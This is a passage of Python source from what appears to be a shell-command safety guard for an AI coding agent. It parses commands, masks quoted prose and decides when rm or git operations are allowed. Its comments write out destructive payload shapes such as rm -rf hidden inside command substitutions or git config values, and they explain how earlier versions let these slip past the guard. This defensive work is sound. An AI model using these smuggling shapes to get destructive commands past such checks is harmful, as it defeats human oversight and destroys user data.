                    break
            if end == -1:
                break
            rest = toks[end][0][_arm_pattern_end(toks[end][0], True) + 1:]
            toks[: end + 1] = [(rest, False, False)] if rest else []
            continue
        m = _FUNC_HEADER_RE.match(text)
        if m:
            toks[0:1] = [("{", False, False)] if m.group(1) else []
            continue
        if len(toks) >= 3 and toks[1][0] == "(" and toks[2][0] == ")" and _FUNC_NAME_RE.match(text):
            del toks[:3]
            continue
        # `f ()` lexes `()` as one word; `f(  )` as `f(` + `)`
        if len(toks) >= 2 and toks[1][0] == "()" and _FUNC_NAME_RE.match(text):
            del toks[:2]
            continue
        if len(toks) >= 2 and toks[1][0] == ")" and text.endswith("(") and _FUNC_NAME_RE.match(text[:-1]):
            del toks[:2]
            continue
        idx = _arm_pattern_end(text)
        if idx != -1:
            rest = text[idx + 1:]
            toks[0:1] = [(rest, False, False)] if rest else []
            continue
        break
    return toks


def strip_command_opener_words(words: List[str]) -> List[str]:
    """:func:`strip_command_openers` over plain words, for walkers without quote info."""
    return [t for t, _fq, _ex in strip_command_openers([(w, False, False) for w in words])]


_FUNC_NAME_RE = _rx(r"^[^\s()$`'\"{}=;&|<>]+$", 0)
_ASSIGN_NAME_RE = _rx(r"^[A-Za-z_]\w*$", 0)


def _scan_masked_tokens(command: str) -> List[List[Tuple[str, bool, bool]]]:
    """Split ``command`` into subcommands of ``(text, fully_quoted, expands)``.

    Quotes/escapes are resolved into the token text (so ``g''h`` -> ``gh``);
    ``fully_quoted`` is True when no character of the token was unquoted.

    ``expands`` is True when the token contains a command substitution the
    shell will actually RUN — i.e. ``$(...)`` or a backtick span appearing
    unquoted or inside DOUBLE quotes. Inside single quotes the shell performs no
    expansion, so ``git commit -m '$(...)'`` is an inert literal and must stay
    maskable; treating it as a command is a false positive on a string nothing
    executes.
    """
    subs: List[List[Tuple[str, bool, bool]]] = []
    cur: List[Tuple[str, bool, bool]] = []
    buf: List[str] = []
    has_unquoted = False
    has_any = False
    expands = False

    def _has_subst(text: str) -> bool:
        return "$(" in text or "`" in text

    def end_token() -> None:
        nonlocal buf, has_unquoted, has_any, expands
        if has_any:
            cur.append(("".join(buf), not has_unquoted, expands))
        buf, has_unquoted, has_any, expands = [], False, False, False

    def end_sub() -> None:
        nonlocal cur
        end_token()
        if cur:
            subs.append(cur)
            cur = []

    def _word_span(i: int) -> int:
        """End of a span that is one word's DATA at ``i`` (#1119), appended to ``buf``; else -1."""
        nonlocal has_unquoted, has_any, expands
        c = command[i]
        if c == "$" and command.startswith("${", i):
            end = _param_expansion_end(command, i)
            if end == -1:
                return -1
            text = command[i:end]
            if _has_subst(text):
                expands = True
            has_unquoted = True
        elif c == "$" and command.startswith("$'", i):
            close = _ansi_c_end(command, i + 2)
            if close == -1:
                return -1
            end, text = close + 1, command[i + 2:close]
        elif c == "[" and buf and _ASSIGN_NAME_RE.match("".join(buf)):
            end = _subscript_end(command, i)
            if end == -1:
                return -1
            text = command[i:end]
            if _has_subst(text):
                expands = True
            has_unquoted = True
        else:
            return -1
        buf.append(text.replace(")", _DATA_PAREN))
        has_any = True
        return end

    i, n = 0, len(command)
    while i < n:
        c = command[i]
        span_end = _word_span(i) if c in "$[" else -1
        if span_end != -1:
            i = span_end
        elif c == "'":
            j = command.find("'", i + 1)
            if j == -1:
                j = n
            # Single quotes suppress expansion entirely — deliberately does NOT
            # set `expands`, however substitution-shaped the contents look.
            buf.append(command[i + 1:j].replace(")", _DATA_PAREN))
            has_any = True
            i = j + 1
        elif c == '"':
            j = i + 1
            out: List[str] = []
            while j < n and command[j] != '"':
                if command.startswith("${", j) and _param_expansion_end(command, j, True) != -1:
                    end = _param_expansion_end(command, j, True)
                    out.append(command[j:end])
                    j = end
                elif command[j] == "\\" and j + 1 < n and command[j + 1] in '"\\$`':
                    out.append(command[j + 1])
                    j += 2
                else:
                    out.append(command[j])
                    j += 1
            span = "".join(out)
            if _has_subst(span):
                expands = True
            buf.append(span.replace(")", _DATA_PAREN))
            has_any = True
            i = j + 1
        elif c == "\\" and i + 1 < n:
            buf.append(command[i + 1].replace(")", _DATA_PAREN))
            has_unquoted = True
            has_any = True
            i += 2
        elif c in " \t":
            end_token()
            i += 1
        elif c in ";\n":
            end_sub()
            i += 1
        elif c in "&|":
            end_sub()
            while i < n and command[i] in "&|":
                i += 1
        else:
            buf.append(c)
            if c == "`" or (c == "(" and buf[-2:-1] == ["$"]):
                expands = True
            has_unquoted = True
            has_any = True
            i += 1
    end_sub()
    return subs


def masked_subcommands(command: str, keep=None) -> List[str]:
    """Return per-subcommand strings with content-only quoted spans masked.

    Used for command-prefix (``anchored``) rules so quoted argument text —
    commit messages, echo strings, heredoc bodies — cannot false-match a
    command rule, while quoting obfuscation of the command itself still
    normalizes to the literal form.

    ``keep`` is an optional predicate over a resolved content token; a token it
    accepts stays visible instead of being masked. The path ladders use it to
    keep quoted operands that mention the guarded path (#922).
    """
    return [" ".join(words) for words in _masked_subcommand_words(command, keep)]


def _masked_subcommand_words(command: str, keep=None) -> List[List[str]]:
    """Token-list form of :func:`masked_subcommands`, before joining."""
    return [words for words, _payload in _masked_subcommand_entries(command, keep)]


def _masked_subcommand_entries(
    command: str, keep=None, _depth: int = 0
) -> List[Tuple[List[str], bool]]:
    """``(words, is_payload_text)`` form of :func:`masked_subcommands`.

    Split out so the ``sh -c "…"`` recursion and the git normalization both
    operate on tokens — re-splitting a joined string would lose the token
    boundaries a ``-C "/my dir"`` argument depends on.

    ``is_payload_text`` marks an entry that is executable TEXT extracted from
    an exec-surface option (``python3 -c '…'``) rather than a command whose
    tokens hold shell positions — anchored matching must scan those anywhere,
    never at command position (#922).
    """
    command = _strip_heredoc_bodies(command)

    assigns: Dict[str, str] = {}
    for m in _ASSIGN_RE.finditer(command):
        assigns[m.group(1)] = m.group(2).strip("'\"")

    def _resolve(tok: str) -> str:
        for name, val in assigns.items():
            tok = tok.replace("${%s}" % name, val).replace("$" + name, val)
        return tok

    if _depth > _RESCAN_MAX_DEPTH:
        return []
    results: List[Tuple[List[str], bool]] = []
    for toks in _scan_masked_tokens(command):
        toks = [
            (text.replace(_DATA_PAREN, ")"), fq, ex)
            for text, fq, ex in strip_command_openers(toks)
        ]
        if not toks:
            continue
        words: List[str] = []
        # Resolved text of EVERY token, content included — the wrapper-payload
        # rescan below (#924/#921) needs the text the masked entry blanks.
        raws: List[str] = []
        prev = ""
        for text, fully_quoted, expands in toks:
            resolved = _resolve(text)
            raws.append(resolved)
            # A quoted token holding a COMMAND SUBSTITUTION is not content, no
            # matter how much prose surrounds it: ``git commit -m "$(rm -rf
            # /x)"`` runs the payload. Masking it hid the payload from every
            # anchored rule, and because ``git.commit`` carries an UNSCOPED
            # default grant the residual ``ask`` resolved to ALLOW with no human
            # — the fail-closed guarantee gone for that shape (#915 review).
            #
            # The failure needed three things and no one of them alone: this
            # PR's anchoring (payload unseen), #917's unscoped grant (ask ->
            # allow unattended), and the pre-existing whitespace-keyed masking.
            # The ``echo "$(…)"`` control has the same shape with no grant and
            # still fails closed, which is what proves the grant load-bearing.
            #
            # NB the mirror arrangement (``rm -rf "$(cat f)"`` — dangerous verb
            # OUTSIDE the quotes) never broke: masking blanks the same token,
            # but the verb is in command position and survives. The hazard is
            # a benign outer command with the danger INSIDE the quotes.
            #
            # Not masking is strictly MORE inclusive, so it cannot weaken any
            # rule; the cost is that a report quoting a substitution alongside a
            # rule token can false-positive again, which is the safe direction.
            # `expands` comes from the SCANNER, which knows the quote type:
            # single quotes suppress expansion, so `git commit -m '$(...)'` is
            # an inert literal and stays maskable. Deriving this from `resolved`
            # instead would lose that distinction and false-positive on a string
            # the shell never runs.
            is_content = (
                fully_quoted
                and not expands
                and (not resolved or any(ch in " \t\n" for ch in resolved))
            )
            if not words and _ASSIGN_TOKEN_RE.match(resolved):
                # Leading VAR=value assignment — its value is data here (the
                # assigns table already handles later ``$VAR`` expansion).
                words.append(_MASK)
                prev = _MASK
                continue
            if is_content:
                # A ``sh -c "…"`` payload is a command, not content — rescan.
                #
                # ANY word so far may be the shell, not just words[0]: a wrapper
                # prefix (``env FOO=1 sh -c``, ``nohup sh -c``, ``timeout 5 sh
                # -c``, ``xargs -I{} sh -c``, ``find . -exec sh -c``) puts the
                # shell in the middle. Keying on words[0] alone meant every one
                # of those payloads was masked away with nothing rescanning it —
                # a BLOCK -> ALLOW regression once the rules are anchored, since
                # the raw haystack is no longer consulted for them.
                #
                # DO NOT HARMONISE THIS WITH ``_strip_global_options``, which
                # scans only the narrow ``_WRAPPER_PREFIXES`` set and documents
                # the resulting gap. The two loops look alike and want OPPOSITE
                # answers, because they do different things:
                #
                #   here  — RE-SCANS a quoted payload that is already isolated.
                #           A false positive costs a rescan of prose, bounded,
                #           and anchoring is what contains it.
                #   there — SYNTHESISES a new command-position haystack. Scan
                #           any word and ``echo git -C /r push --force`` finds
                #           "git" at index 1, emits ``echo git push --force``,
                #           and the force-push rule matches an ECHO — a false
                #           BLOCK on prose, produced by the guard that exists
                #           because prose was being blocked (#675/#915).
                #
                # Verified: that echo is ``allow`` today and must stay so.
                # Any-word is right for a payload you re-scan and wrong for a
                # haystack you construct.
                if (
                    words
                    and prev.startswith("-")
                    and "c" in prev
                    and any(w.rsplit("/", 1)[-1] in _SHELL_NAMES for w in words)
                ):
                    results.extend(
                        _masked_subcommand_entries(resolved, keep, _depth + 1)
                    )
                elif keep is not None and keep(resolved):
                    # Ladder keep-predicate (#922): this content token mentions
                    # the guarded path, so it stays visible — masking may only
                    # remove verbs that had nothing to do with the path.
                    words.append(resolved)
                    prev = resolved
                    continue
                else:
                    # Not a shell payload — but it may still be the value of an
                    # EXEC SURFACE option, where the token is executable text
                    # rather than data. Emit it as its own haystack entry so the
                    # anchored rules see it; do NOT re-parse it as shell, since
                    # `python3 -c` payloads are Python that merely contain a
                    # command.
                    exec_flags = None
                    for w in words:
                        cand = _EXEC_SURFACES.get(w.rsplit("/", 1)[-1])
                        if cand is not None:
                            exec_flags = cand
                            break
                    if exec_flags is not None and (
                        not exec_flags or prev in exec_flags
                    ):
                        results.append(([resolved], True))
                words.append(_MASK)
                prev = _MASK
            else:
                words.append(resolved)
                prev = resolved
        if words and any(w != _MASK for w in words):
            results.append((words, False))
        # Wrapper-payload rescan (#924) + exec-valued git config values (#921):
        # both are commands smuggled through a single segment's arguments, and
        # both are re-scanned as commands in their own right so every rule —
        # anchored ones at real command positions — applies to them. Reads
        # ``raws`` because the masked walk above has already blanked quoted
        # payloads to ``_MASK``.
        payloads: List[str] = []
        ssh_payload = _ssh_remote_payload(raws)
        if ssh_payload:
            payloads.append(ssh_payload)
        payloads.extend(_git_exec_config_payloads(raws))
        for payload in payloads:
            results.extend(_masked_subcommand_entries(payload, keep, _depth + 1))
    return results


#
# COMMAND-POSITION ENFORCEMENT FOR ANCHORED RULES (#922, mechanism 3)
#
# ``anchored: true`` has always MEANT "match command position only, never
# argument content" (#675), but the implementation only swapped the haystack —
# the regex itself still matched anywhere in the masked string. Masking removes
# multi-word quoted prose, so what slipped through was every verb that arrives
# as a bare or single-word-quoted OPERAND: ``grep -c "rm" core.yaml`` matched
# ``\brm\s+[^-]`` inside grep's arguments, and a trailing ``# comment``
# mentioning ``git reset --hard`` matched the reset rule (the whitespace-keyed
# masking gap in #922).
#
# The fix is positional: an anchored rule's match must START inside one of the
# tokens that can actually BE the command — the leading wrapper chain (sudo,
# env, xargs, timeout 5, nice -n 19 …) plus the first real command token.
# ``grep`` ends that chain, so ``rm`` as grep's operand is no longer a
# matchable position; ``rm`` after ``sudo -u user`` still is. Spans cover the
# whole token, so a path-invoked ``/usr/bin/git push`` still matches at ``git``.
#
# Two entry classes are exempt and scanned anywhere, both because their text
# has no shell positions to enforce: exec-surface payloads (``python3 -c '…'``,
# emitted as bare program text) and segments running a tool whose arguments ARE
# a program (the _EXEC_SURFACES / _SHELL_NAMES tables — tmux/watch/awk/sh…).
# Rules that deliberately match argument content (payloads.yaml, remote.yaml)
# are unanchored and read the raw haystacks; nothing here touches them.

# Wrappers whose presence keeps the command position OPEN: the real command of
# ``sudo rm`` / ``timeout 5 rm`` / ``npx prisma`` is still the next token. A
# superset of ``_WRAPPER_PREFIXES`` (which synthesizes haystacks and must stay
# narrow — see the note there); here a too-wide entry only costs a false BLOCK,
# never a bypass, so the arg-taking runners and package launchers are included.
_POSITION_WRAPPERS = _WRAPPER_PREFIXES | _PREFIX_WRAPPERS | {
    "timeout", "setsid", "stdbuf", "ionice", "parallel",
    # package launchers — ``npx prisma migrate deploy`` runs prisma
    "npx", "pnpx", "bunx", "uvx", "pipx",
    # two-token launchers (``uv run <tool>``, ``npm exec <tool>``): both halves
    # keep the chain open; the worst case is an extra allowed START, never a
    # missed one.
    "uv", "npm", "pnpm", "yarn", "bun", "bundle", "run", "exec", "dlx",
}


# Wrappers that take a bare operand BEFORE the command (``flock /tmp/l git …``,
# ``chroot /new git …``, ``sg grp -c git …``): the operand is neither an option nor a number, so the
# walk above would end the chain at it and hide the real command.
_WRAPPER_OPERANDS = {"flock": 1, "lockf": 1, "chroot": 1, "sg": 1}


def _allowed_match_spans(words: List[str]) -> List[Tuple[int, int]]:
    """Char spans of ``" ".join(words)`` where an anchored rule may START.

    Walks the leading wrapper chain: wrapper names, masks, assignments,
    option-shaped tokens, their values and bare numbers all keep the chain
    open; the first token that is none of those is the real command — its span
    is the last allowed one. Every token in the chain is itself an allowed
    start (the wrapper might be the ruled tool, as in ``\\bsudo\\s+rm\\b``).
    """
    spans: List[Tuple[int, int]] = []
    pos = 0
    prev_was_option = False
    operands = 0  # bare operands the last wrapper takes before the command
    for word in words:
        spans.append((pos, pos + len(word)))
        pos += len(word) + 1
        base = word.rsplit("/", 1)[-1]
        if base in _POSITION_WRAPPERS or word == _MASK or _ASSIGN_TOKEN_RE.match(word):
            prev_was_option = False
            operands = _WRAPPER_OPERANDS.get(base, 0)
            continue
        if word.startswith("-"):
            prev_was_option = True
            continue
        if prev_was_option or (word[:1].isdigit()):
            prev_was_option = False
            continue
        if operands:
            operands -= 1
            continue
        break
    return spans


def anchored_match_entries(command: str) -> List[Tuple[str, Optional[List[Tuple[int, int]]]]]:
    """``(haystack, allowed start spans | None)`` pairs for anchored rules.

    ``None`` means match anywhere — exec-surface payload text and segments
    whose tool executes its arguments (see the section note above).
    """
    entries: List[Tuple[str, Optional[List[Tuple[int, int]]]]] = []
    for words, payload in _masked_subcommand_entries(command):
        text = " ".join(words)
        if payload or "$(" in text or "`" in text or any(
            w.rsplit("/", 1)[-1] in _EXEC_SURFACES
            or w.rsplit("/", 1)[-1] in _SHELL_NAMES
            or " " in w or "\t" in w
            for w in words
        ):
            # Match anywhere: payload text has no shell positions; a LIVE
            # command substitution runs wherever it sits — position-gating
            # ``git commit -m "$(rm -rf /x)"`` would hand the payload to the
            # granted carrier rule instead of the rm rule (#915 review); and a
            # token with INTERNAL whitespace is a quoted payload riding an
            # unquoted prefix (``git -c core.pager='rm -rf /x' fetch``), whose
            # coverage lives on matching inside it.
            entries.append((text, None))
        else:
            entries.append((text, _allowed_match_spans(words)))
    return entries


def _normalized_match_entries(command: str) -> List[Tuple[str, Optional[List[Tuple[int, int]]]]]:
    """Global-option-stripped variants with their allowed start spans."""
    out: List[Tuple[str, Optional[List[Tuple[int, int]]]]] = []
    seen: set = set()
    for words, payload in _masked_subcommand_entries(command):
        normalized = _strip_global_options(words)
        if normalized is None:
            continue
        text = " ".join(normalized)
        if text in seen:
            continue
        seen.add(text)
        out.append((text, None if payload else _allowed_match_spans(normalized)))
    return out


def _search_match_entries(
    pattern: str,
    entries: List[Tuple[str, Optional[List[Tuple[int, int]]]]],
) -> bool:
    """``re.search`` over entries, honoring each entry's allowed start spans."""
    for text, spans in entries:
        try:
            if spans is None:
                if _rx(pattern).search(text):
                    return True
                continue
            for m in _rx(pattern).finditer(text):
                if any(start <= m.start() < end for start, end in spans):
                    return True
        except re.error:
            return False
    return False


# ============================================================================
# DECISION LADDERS
# ============================================================================


# ---------------------------------------------------------------------------
# Prose operands (#940). A commit message or a PR/issue body is DATA handed to
# git/gh — it never runs. Rules that match text anywhere (SQL statements, path
# mentions) read "rm <file>" or a SQL keyword inside one as a command, and a
# human writing an honest message about a rule gets stopped by it. The value is
# replaced with a placeholder for rule matching ONLY when it is a pure quoted
# string with nothing that executes: a double-quoted value holding `$(` or a
# backtick stays visible (that substitution RUNS), and nothing else about the
# command is touched, so `git commit -m "x" && psql -c "<sql>"` still reads the
# second half in full.
# ---------------------------------------------------------------------------

_PROSE_FLAG_RE = re.compile(r'^(?:-[A-Za-z]*m|--message|--body|-b|--title|-t|--notes)$')
_PROSE_OPERATORS = set(";&|()<>\n")
_PROSE_PLACEHOLDER = '"PROSE"'
_GH_PROSE_GROUPS = {"pr", "issue", "release"}
_GH_PROSE_VERBS = {"create", "edit", "comment", "review", "close", "reopen"}


def _prose_tokens(command: str) -> Optional[List[Tuple[int, int, str]]]:
    """Top-level tokens as ``(start, end, raw)``; operators are their own tokens.

    None on unbalanced quotes — the caller then leaves the command alone.
    """
    tokens: List[Tuple[int, int, str]] = []
    i, n = 0, len(command)
    while i < n:
        ch = command[i]
        if ch in " \t":
            i += 1
            continue
        if ch in _PROSE_OPERATORS:
            tokens.append((i, i + 1, ch))
            i += 1
            continue
        start = i
        while i < n and command[i] not in " \t" and command[i] not in _PROSE_OPERATORS:
            c = command[i]
            if c == "\\" and i + 1 < n:
                i += 2
            elif c in "'\"":
                j = i + 1
                while j < n and command[j] != c:
                    j += 2 if (c == '"' and command[j] == "\\") else 1
                if j >= n:
                    return None
                i = j + 1
            else:
                i += 1
        tokens.append((start, i, command[start:i]))
    return tokens


def _pure_quoted_value(raw: str) -> bool:
    """A single quoted string, nothing outside the quotes, nothing that executes."""
    if len(raw) < 2 or raw[0] not in "'\"" or raw[-1] != raw[0]:
        return False
    body = raw[1:-1]
    if raw[0] == "'":
        return "'" not in body
    return not re.search(r'(?<!\\)(?:\$\(|`)', body) and not re.search(r'(?<!\\)"', body)


def mask_prose_operands(command: str) -> str:
    """``command`` with git/gh message-and-body values replaced by a placeholder."""
    if "git" not in command and "gh" not in command:
        return command
    tokens = _prose_tokens(command)
    if not tokens:
        return command
    spans: List[Tuple[int, int]] = []
    seg: List[Tuple[int, int, str]] = []

    def _flush() -> None:
        words = [t for t in seg if t[2] not in _PROSE_OPERATORS]
        texts = [t[2] for t in words]
        if not texts:
            return
        head = os.path.basename(texts[0])
        takes_prose = (
            head == "git" and any(t in ("commit", "tag") for t in texts[1:4])
        ) or (
            head == "gh" and len(texts) > 2 and texts[1] in _GH_PROSE_GROUPS and texts[2] in _GH_PROSE_VERBS
        )
        if not takes_prose:
            return
        for k, (s, e, raw) in enumerate(words):
            if _PROSE_FLAG_RE.match(raw) and k + 1 < len(words):
                vs, ve, vraw = words[k + 1]
                if _pure_quoted_value(vraw):
                    spans.append((vs, ve))
            elif "=" in raw and _PROSE_FLAG_RE.match(raw.split("=", 1)[0]):
                flag, _, vraw = raw.partition("=")
                if _pure_quoted_value(vraw):
                    spans.append((s + len(flag) + 1, e))

    for tok in tokens:
        if tok[2] in (";", "&", "|", "\n"):
            _flush()
            seg = []
        else:
            seg.append(tok)
    _flush()
    if not spans:
        return command
    out, pos = [], 0
    for s, e in sorted(spans):
        out.append(command[pos:s])
        out.append(_PROSE_PLACEHOLDER)
        pos = e
    out.append(command[pos:])
    return "".join(out)


# ---------------------------------------------------------------------------
# Recoverable `rm` (#940). A plain `rm <file>` is destructive only when the
# bytes cannot come back, so the rule yields exactly when they can: the target
# is a session scratch file, untracked/ignored in a git repo (the owner's call:
# local, small, the agent's own artefact), or tracked with NO uncommitted
# change (git has it). Anything else — flags, globs, variables, directories,
# a tracked file with local edits, a file outside every repo — stays blocked.
# `git rm` is NOT covered here; it is its own ask rule.
# ---------------------------------------------------------------------------

_REDIRECT_TOKEN_RE = re.compile(r'^[<>&|]+$')
_GLOB_OR_EXPANSION_RE = re.compile(r'[*?\[\]{}$`\\]')


def _newlines_as_separators(command: str) -> str:
    """Unquoted newlines become ``;`` — shlex reads them as plain whitespace.

    Without this, ``cat > f <<'EOF' … EOF`` newline ``rm x`` folds the `rm` into
    the `cat` segment. A backslash-newline is a continuation, not a separator.
    """
    out: List[str] = []
    quote = ""
    i = 0
    while i < len(command):
        ch = command[i]
        if quote:
            out.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < len(command):
                out.append(command[i + 1])
                i += 1
            elif ch == quote:
                quote = ""
        elif ch in "'\"":
            quote = ch
            out.append(ch)
        elif ch == "\\" and i + 1 < len(command) and command[i + 1] == "\n":
            out.append(" ")
            i += 1
        elif ch == "\n":
            out.append(" ; ")
        else:
            out.append(ch)
        i += 1
    return "".join(out)


def _scratch_roots() -> List[str]:
    uid = os.getuid()
    roots = {f"/tmp/claude-{uid}", f"/private/tmp/claude-{uid}"}
    roots |= {os.path.realpath(r) for r in list(roots)}
    return sorted(roots)


def _git_file_state(repo: str, rel: str) -> Optional[str]:
    """``untracked`` | ``clean`` | ``modified`` for ``rel`` in ``repo``; None on error.

    ``clean`` means tracked with no staged or unstaged change, so ``git
    checkout`` restores it. One short subprocess, only ever reached when an
    `rm` rule already matched.
    """
    import subprocess

    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    base = ["git", "--no-optional-locks", "-c", "core.fsmonitor=false", "-C", repo]
    try:
        tracked = subprocess.run(
            base + ["ls-files", "--error-unmatch", "--", rel],
            capture_output=True, text=True, timeout=3, env=env,
        )
        if tracked.returncode != 0:
            return "untracked"
        status = subprocess.run(
            base + ["status", "--porcelain", "--untracked-files=no", "--", rel],
            capture_output=True, text=True, timeout=3, env=env,
        )
        if status.returncode != 0:
            return None
        return "modified" if status.stdout.strip() else "clean"
    except (OSError, subprocess.SubprocessError):
        return None


def _rm_target_is_recoverable(path: str) -> bool:
    """Whether removing the single file ``path`` loses nothing git/scratch can't give back."""
    parent, name = os.path.split(path)
    if not name:
        return False
    real_target = os.path.join(os.path.realpath(parent), name)
    if not os.path.lexists(real_target):
        return True  # rm of a missing file is a no-op
    if os.path.isdir(real_target) and not os.path.islink(real_target):
        return False
    for root in _scratch_roots():
        if real_target == root or real_target.startswith(root + os.sep):
            return True
    repo = _git_repo_root(os.path.dirname(real_target))
    if repo is None:
        return False
    rel = os.path.relpath(real_target, repo)
    if rel == ".git" or rel.startswith(".git" + os.sep) or rel.startswith(".." + os.sep):
        return False
    return _git_file_state(repo, rel) in ("untracked", "clean")


_VAR_REF_RE = re.compile(r'\$(?:\{(\w+)\}|(\w+))')
_RM_FLAGS_RE = re.compile(r'^-[rRf]+$')


def _expand_known_vars(token: str, env: Dict[str, str]) -> str:
    """Replace ``$NAME`` / ``${NAME}`` that a literal assignment defined; leave the rest."""
    def sub(m: "re.Match[str]") -> str:
        name = m.group(1) or m.group(2)
        return env.get(name, m.group(0))
    return _VAR_REF_RE.sub(sub, token)


def _is_verb(argv: List[str], verb: str) -> bool:
    """``argv`` is the verb's own invocation: `rm ...` or `git clean ...`."""
    head = os.path.basename(argv[0])
    if verb in ("rm", "find"):
        return head == verb
    return head == "git" and len(argv) > 1 and argv[1] == "clean"


def _mentions_verb(argv: List[str], verb: str) -> bool:
    """The verb appears somewhere it is not at the head: a wrapper's payload."""
    if verb in ("rm", "find"):
        return any(os.path.basename(t) == verb for t in argv[1:])
    return "clean" in argv and any(os.path.basename(t) == "git" for t in argv)


# A subshell group cannot move the parent's directory or set its variables, so
# one that holds no cd/assignment/export and never names the verbs being judged
# adds nothing to the model: ``(npm run start >/dev/null 2>&1 &)``, the usual
# way to start a server before screenshots. Only a ``(`` at command position is a
# group; case-arm patterns, extglobs, array assignments and empty ``()`` are not.
# Anything else stays unmodelled.
_INERT_GROUP_RE = re.compile(r"\(([^()`$]*|[^()`]*\$[A-Za-z_{][^()`]*)\)")
_GROUP_UNSAFE_RE = re.compile(
    r"(?:^|[\s;&|])(?:[A-Za-z_]\w*=|(?:cd|pushd|popd|export|eval|source|rm|find|git|xargs|sh|bash|zsh|env|exec)\b)|\.\s"
)


_CASE_WORD_RE = re.compile(r"(?<![\w./-])case(?![\w.-])")


def _group_in_command_position(prefix: str) -> bool:
    """Whether a ``(`` that follows ``prefix`` opens a subshell group (not a pattern, array or extglob).

    Only a ``(`` at command position qualifies: after the start of the text, a
    newline, ``;``, ``&``, ``|`` or a spaced ``!`` (case arms never get here:
    ``_replace_inert_groups`` leaves any command containing ``case`` alone). Directly after a word character, an assignment, an extglob
    operator or a ``(``, or after any other word (``in``, ``echo``), it is
    something else, so it is left alone.
    """
    stripped = prefix.rstrip(" \t")
    if not stripped:
        return True
    last = stripped[-1]
    spaced = len(stripped) != len(prefix)
    if last in "\n&|;":
        return True
    return last == "!" and spaced


def _replace_inert_groups(command: str) -> str:
    """``command`` with each harmless one-level subshell group replaced by ``:``."""
    if _CASE_WORD_RE.search(command):
        return command  # case arms are written ``(pat) cmd ;;``: not groups
    def sub(m: "re.Match[str]") -> str:
        inner = m.group(1)
        if not inner.strip() or _GROUP_UNSAFE_RE.search(inner) or not _group_in_command_position(m.string[: m.start()]):
            return m.group(0)
        return ":"
    return _INERT_GROUP_RE.sub(sub, command)


def _parse_rm_command(
    command: str, cwd: Optional[str], verb: str = "rm"
) -> Optional[List[Tuple[List[str], List[str], str]]]:
    """Every ``verb`` (`rm` or `git clean`) in ``command`` as ``(flags, operands, directory)``; None if unmodelled.

    Operands are the words after the flags with literal ``VAR=value`` assignments
    expanded (``S=/tmp/x; rm $S/f``). None on anything this parser will not
    reason about: no cwd, a group/subshell, an `rm` that is not at the head of
    its segment, a `cd` that is not a literal `&&`-joined target, an `rm` with
    no operand. A command with no `rm` at all yields ``[]``.
    """
    if not cwd:
        return None
    masked, mask_err = _mask_command_substitutions(inert_view(command))
    if mask_err:
        return None
    segments, split_err = _scope_segments(_newlines_as_separators(_replace_inert_groups(masked)))
    if split_err:
        return None
    current = os.path.abspath(cwd)
    env: Dict[str, str] = {}
    found: List[Tuple[List[str], List[str], str]] = []
    for argv, following_op in segments:
        if strip_command_opener_words(argv) != argv:
            return None  # compound syntax: the directory/env context is not modelled
        assigns, argv = _split_assignments(argv)
        if argv and os.path.basename(argv[0]) == "export" and all(_ASSIGN_TOKEN_RE.match(t) for t in argv[1:]):
            assigns, argv = argv[1:], []
        if not argv:
            for a in assigns:
                name, _, value = a.partition("=")
                if _CMD_SUBST_SENTINEL in value or _GLOB_OR_EXPANSION_RE.search(value):
                    env.pop(name, None)
                else:
                    env[name] = _expand_known_vars(value, env)
            continue
        head = os.path.basename(argv[0])
        if head in _CWD_CHANGING:
            if head != "cd" or following_op != "&&":
                return None
            target = _cd_target(argv)
            if target is None:
                return None
            current = _resolve_dir(target, current)[0]
            continue
        if not _is_verb(argv, verb):
            # The verb anywhere but the head of a segment belongs to a wrapper.
            if _mentions_verb(argv, verb):
                return None
            continue
        flags: List[str] = []
        operands: List[str] = []
        skip_next = False
        first = 2 if verb == "git clean" else 1
        for i, tok in enumerate(argv[first:], start=first):
            if skip_next:
                skip_next = False
                continue
            if _REDIRECT_TOKEN_RE.match(tok):
                skip_next = True
                if operands and argv[i - 1].isdigit():
                    operands.pop()  # the `2` of `2>/dev/null`
                continue
            if tok.startswith("-") and not operands:
                flags.append(tok)
            else:
                operands.append(_expand_known_vars(tok, env))
        if not operands:
            return None
        found.append((flags, operands, current))
    return found


def _operand_is_literal(tok: str) -> bool:
    return not (tok.startswith("-") or _CMD_SUBST_SENTINEL in tok or _GLOB_OR_EXPANSION_RE.search(tok))


def rm_removes_only_recoverable_files(command: str, cwd: Optional[str]) -> bool:
    """True only when EVERY `rm` in ``command`` removes just recoverable plain files.

    No flags, literal operands only (variables resolve only through a literal
    assignment earlier in the same command), each a scratch/untracked/clean file.
    """
    parsed = _parse_rm_command(command, cwd)
    if not parsed:
        return False
    for flags, operands, directory in parsed:
        if flags:
            if not _rm_entry_in_scratch(flags, operands, directory):
                return False
            continue
        for tok in operands:
            if not _operand_is_literal(tok) or not _rm_target_is_recoverable(_abs_path(tok, directory)):
                return False
    return True


def _inside_scratch(path: str) -> bool:
    """Strictly inside a session scratch dir: at least project/session/entry below the root."""
    for root in _scratch_roots():
        if not path.startswith(root + os.sep):
            continue
        if len(Path(path[len(root) + 1:]).parts) >= 3:
            return True
    return False


def _rm_entry_in_scratch(flags: List[str], operands: List[str], directory: str) -> bool:
    """One `rm` (flags limited to r, R, f) whose every operand is strictly inside scratch."""
    if not all(_RM_FLAGS_RE.match(f) for f in flags):
        return False
    for tok in operands:
        if not _operand_is_literal(tok) or tok.endswith("/"):
            return False
        path = _abs_path(tok, directory)
        if os.path.islink(path):
            return False
        real = os.path.join(os.path.realpath(os.path.dirname(path)), os.path.basename(path))
        if not _inside_scratch(real) or (os.path.lexists(path) and not _inside_scratch(os.path.realpath(path))):
            return False
    return True


def rm_with_flags_only_in_scratch(command: str, cwd: Optional[str]) -> bool:
    """True only when every `rm` in ``command`` targets paths inside a scratch dir.

    The scratch dir is disposable by design, so a forced recursive removal there
    loses nothing. Literal operands only; a symlink target is refused, and the
    scratch root itself is never a target.
    """
    parsed = _parse_rm_command(command, cwd)
    if not parsed:
        return False
    return all(_rm_entry_in_scratch(f, o, d) for f, o, d in parsed)


# `find` primaries that cannot run a program or write a file, with the number of
# words each consumes. Anything outside this table (-exec, -ok, -fprint, -fls,
# -delete's siblings that act) makes the whole find unmodelled.
_FIND_PRIMARIES = {
    "-delete": 0, "-empty": 0, "-prune": 0, "-print": 0, "-print0": 0,
    "-o": 0, "-a": 0, "-and": 0, "-or": 0, "-not": 0, "!": 0,
    "-name": 1, "-iname": 1, "-path": 1, "-ipath": 1, "-type": 1, "-mtime": 1,
